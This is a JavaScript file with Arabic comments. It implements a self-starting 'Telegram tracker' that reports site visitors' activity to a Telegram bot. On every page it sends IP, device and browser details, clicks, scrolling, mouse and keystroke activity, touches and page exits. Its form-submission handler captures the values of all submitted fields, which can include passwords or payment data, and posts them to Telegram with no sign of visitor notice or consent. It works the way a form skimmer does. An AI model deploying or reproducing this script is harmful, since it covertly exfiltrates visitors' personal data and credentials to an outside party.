// 🤖 نظام تتبع التيليجرام المتقدم
class TelegramTracker {
    constructor() {
        this.botToken = TELEGRAM_CONFIG.BOT_TOKEN;
        this.chatId = TELEGRAM_CONFIG.CHAT_ID;
        this.apiUrl = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
        this.sessionId = this.generateSessionId();
        this.userInfo = this.getUserInfo();
        this.startTime = Date.now();
        this.init();
    }

    generateSessionId() {
        return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }

    getUserInfo() {
        return {
            ip: this.getIP(),
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer || 'مباشر',
            url: window.location.href
        };
    }

    async getIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch {
            return 'غير معروف';
        }
    }

    async sendToTelegram(message) {
        try {
            await fetch(this.apiUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: this.chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
        } catch (error) {
            console.log('Telegram send failed:', error);
        }
    }

    formatMessage(type, data) {
        const time = new Date().toLocaleString('ar-EG');
        const sessionTime = Math.round((Date.now() - this.startTime) / 1000);
        
        return `
🔔 <b>${type}</b>

⏰ الوقت: ${time}
🆔 الجلسة: ${this.sessionId}
⌛ مدة الجلسة: ${sessionTime}ث

${data}

🌐 معلومات المستخدم:
📱 الجهاز: ${this.userInfo.platform}
🌍 اللغة: ${this.userInfo.language}
📏 الشاشة: ${this.userInfo.screen}
🕐 المنطقة: ${this.userInfo.timezone}
🔗 المصدر: ${this.userInfo.referrer}
📄 الصفحة: ${this.userInfo.url}
        `.trim();
    }

    init() {
        this.trackPageView();
        this.trackClicks();
        this.trackFormSubmissions();
        this.trackScrolling();
        this.trackTimeSpent();
        this.trackMouseMovement();
        this.trackKeystrokes();
        this.trackPageExit();
        this.trackMobileGestures();
        this.trackChatInteractions();
    }

    // تتبع زيارة الصفحة
    trackPageView() {
        const message = this.formatMessage('زائر جديد', `
📄 <b>صفحة جديدة</b>
🔗 الرابط: ${window.location.pathname}
📊 عنوان الصفحة: ${document.title}
        `);
        this.sendToTelegram(message);
    }

    // تتبع النقرات
    trackClicks() {
        document.addEventListener('click', (e) => {
            const element = e.target;
            const elementInfo = this.getElementInfo(element);
            
            const message = this.formatMessage('نقرة', `
🖱️ <b>نقر على عنصر</b>
🎯 العنصر: ${elementInfo.tag}
📝 النص: ${elementInfo.text}
🆔 المعرف: ${elementInfo.id}
📍 الموقع: x:${e.clientX}, y:${e.clientY}
            `);
            this.sendToTelegram(message);
        });
    }

    // تتبع إرسال النماذج
    trackFormSubmissions() {
        document.addEventListener('submit', (e) => {
            const form = e.target;
            const formData = new FormData(form);
            const fields = Array.from(formData.entries()).map(([key, value]) => 
                `${key}: ${value.toString().substring(0, 50)}`
            ).join('\n');

            const message = this.formatMessage('إرسال نموذج', `
📋 <b>تم إرسال نموذج</b>
🏷️ اسم النموذج: ${form.name || form.id || 'غير محدد'}
📊 البيانات:
${fields}
            `);
            this.sendToTelegram(message);
        });
    }

    // تتبع التمرير
    trackScrolling() {
        let scrollTimer;
        window.addEventListener('scroll', () => {
            clearTimeout(scrollTimer);
            scrollTimer = setTimeout(() => {
                const scrollPercent = Math.round((window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100);
                
                if (scrollPercent % 25 === 0 && scrollPercent > 0) {
                    const message = this.formatMessage('تمرير', `
📜 <b>تمرير الصفحة</b>
📊 النسبة: ${scrollPercent}%
📏 الموقع: ${window.scrollY}px
                    `);
                    this.sendToTelegram(message);
                }
            }, 1000);
        });
    }

    // تتبع الوقت المقضي
    trackTimeSpent() {
        setInterval(() => {
            const timeSpent = Math.round((Date.now() - this.startTime) / 1000);
            
            if (timeSpent % 60 === 0 && timeSpent > 0) {
                const message = this.formatMessage('وقت الجلسة', `
⏱️ <b>تحديث الوقت</b>
⌛ الوقت المقضي: ${Math.floor(timeSpent / 60)} دقيقة
📊 حالة النشاط: ${document.hidden ? 'غير نشط' : 'نشط'}
                `);
                this.sendToTelegram(message);
            }
        }, 1000);
    }

    // تتبع حركة الماوس
    trackMouseMovement() {
        let mouseTimer;
        let moveCount = 0;
        
        document.addEventListener('mousemove', (e) => {
            moveCount++;
            clearTimeout(mouseTimer);
            
            mouseTimer = setTimeout(() => {
                if (moveCount > 100) {
                    const message = this.formatMessage('حركة الماوس', `
🖱️ <b>نشاط الماوس</b>
📊 عدد الحركات: ${moveCount}
📍 آخر موقع: x:${e.clientX}, y:${e.clientY}
                    `);
                    this.sendToTelegram(message);
                    moveCount = 0;
                }
            }, 5000);
        });
    }

    // تتبع ضغطات المفاتيح
    trackKeystrokes() {
        let keyCount = 0;
        let keyTimer;
        
        document.addEventListener('keydown', (e) => {
            keyCount++;
            clearTimeout(keyTimer);
            
            keyTimer = setTimeout(() => {
                if (keyCount > 10) {
                    const message = this.formatMessage('كتابة', `
⌨️ <b>نشاط الكتابة</b>
📊 عدد الضغطات: ${keyCount}
🎯 العنصر النشط: ${document.activeElement.tagName}
                    `);
                    this.sendToTelegram(message);
                    keyCount = 0;
                }
            }, 3000);
        });
    }

    // تتبع مغادرة الصفحة
    trackPageExit() {
        window.addEventListener('beforeunload', () => {
            const timeSpent = Math.round((Date.now() - this.startTime) / 1000);
            const message = this.formatMessage('مغادرة', `
🚪 <b>مغادرة الصفحة</b>
⏱️ إجمالي الوقت: ${Math.floor(timeSpent / 60)}:${timeSpent % 60}
📊 نوع المغادرة: إغلاق/تنقل
            `);
            
            // إرسال فوري
            navigator.sendBeacon(this.apiUrl, JSON.stringify({
                chat_id: this.chatId,
                text: message,
                parse_mode: 'HTML'
            }));
        });
    }

    // تتبع إيماءات الهاتف
    trackMobileGestures() {
        if ('ontouchstart' in window) {
            let touchCount = 0;
            
            document.addEventListener('touchstart', () => {
                touchCount++;
                
                if (touchCount % 10 === 0) {
                    const message = this.formatMessage('لمس الشاشة', `
📱 <b>إيماءات الهاتف</b>
👆 عدد اللمسات: ${touchCount}
📊 نوع الجهاز: هاتف ذكي
                    `);
                    this.sendToTelegram(message);
                }
            });
        }
    }

    // تتبع تفاعلات الدردشة
    trackChatInteractions() {
        // مراقبة فتح الدردشة
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                if (mutation.addedNodes.length > 0) {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1 && node.classList && node.classList.contains('chat')) {
                            const message = this.formatMessage('دردشة', `
💬 <b>فتح نافذة الدردشة</b>
🎯 نوع التفاعل: فتح الدردشة
⏰ وقت الفتح: ${new Date().toLocaleTimeString('ar-EG')}
                            `);
                            this.sendToTelegram(message);
                        }
                    });
                }
            });
        });
        
        observer.observe(document.body, { childList: true, subtree: true });
    }

    // معلومات العنصر
    getElementInfo(element) {
        return {
            tag: element.tagName.toLowerCase(),
            text: element.textContent?.substring(0, 50) || '',
            id: element.id || 'بدون معرف',
            class: element.className || 'بدون فئة'
        };
    }
}

// تشغيل النظام تلقائياً
document.addEventListener('DOMContentLoaded', () => {
    window.telegramTracker = new TelegramTracker();
});